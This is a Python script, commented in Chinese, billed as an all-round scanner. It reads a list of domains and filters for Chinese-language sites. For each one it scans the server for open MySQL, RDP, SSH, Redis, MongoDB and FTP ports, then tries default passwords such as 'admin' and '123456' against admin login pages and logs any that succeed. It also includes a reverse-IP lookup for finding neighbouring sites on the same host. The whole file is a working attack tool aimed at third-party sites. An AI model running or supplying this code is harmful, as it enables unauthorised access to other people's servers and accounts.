#!/usr/bin/env python3
"""
全能扫描器 v6: 域名+同IP站点+服务器漏洞
"""
import urllib.request, re, subprocess, json, socket

DOMAIN_FILE = "/tmp/165_dm.txt"
OUT_FILE = "/tmp/scan_v6_out.txt"

def log(msg):
    with open(OUT_FILE, "a") as f:
        f.write(msg + "\n")
    print(msg)

def check_port(ip, port, timeout=2):
    try:
        s = socket.socket(); s.settimeout(timeout)
        r = s.connect_ex((ip, port)); s.close()
        return r == 0
    except:
        return False

# 1. 域名扫描
domains = [l.strip() for l in open(DOMAIN_FILE) if l.strip()]
for d in domains:
    if not d: continue
    try:
        req = urllib.request.Request("http://"+d, headers={"User-Agent":"Mozilla/5.0"})
        h = urllib.request.urlopen(req, timeout=5).read().decode("utf-8","ignore")
    except:
        continue
    if len(h) < 500 or not re.search(r'[\u4e00-\u9fff]{10,}', h): continue
    name = d.split(".")[0]
    
    # DNS解析IP
    try: ip = socket.gethostbyname(d)
    except: ip = ""
    
    # 服务器头
    server = ""
    try:
        req2 = urllib.request.Request("http://"+d, headers={"User-Agent":"Mozilla/5.0"})
        resp = urllib.request.urlopen(req2, timeout=5)
        server = resp.headers.get("Server", "")
    except: pass
    
    if ip:
        # 端口扫描
        ports_found = []
        for port, svc in [(3306,"MySQL"),(3389,"RDP"),(22,"SSH"),(21,"FTP"),(6379,"Redis"),(27017,"MongoDB"),(8080,"HTTP-8080")]:
            if check_port(ip, port):
                ports_found.append(f"{port}({svc})")
        if ports_found:
            log(f"PORTS: {d}({ip}) | {','.join(ports_found)} | Server:{server}")
    
    # 后台+默认密码
    for p in ["/admin","/login","/admin/login","/admin.php"]:
        try:
            req2 = urllib.request.Request("http://"+d+p, headers={"User-Agent":"Mozilla/5.0"})
            h2 = urllib.request.urlopen(req2, timeout=5).read()
            s2 = len(h2)
            if s2 < 300: continue
            for pw in ["admin","123456","admin123",name,name+"123","admin888"]:
                data = ("username=admin&password="+pw).encode()
                req3 = urllib.request.Request("http://"+d+p, data=data, headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"})
                try:
                    h3 = urllib.request.urlopen(req3, timeout=5).read()
                    s3 = len(h3)
                    if s3 > 3000 and s3 != s2:
                        log(f"PASS: {d}|{p}|{pw}|{s3}B")
                        break
                except: pass
        except: pass

log(f"DONE: {len(domains)} scanned")

# 2. 同IP网站发现(通过Bing反向IP查询)
def reverse_ip(ip):
    sites = set()
    try:
        url = "https://api.hackertarget.com/reverseiplookup/?q=" + ip
        req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
        resp = urllib.request.urlopen(req, timeout=10)
        for line in resp.read().decode().split():
            sites.add(line.strip())
    except: pass
    return sites
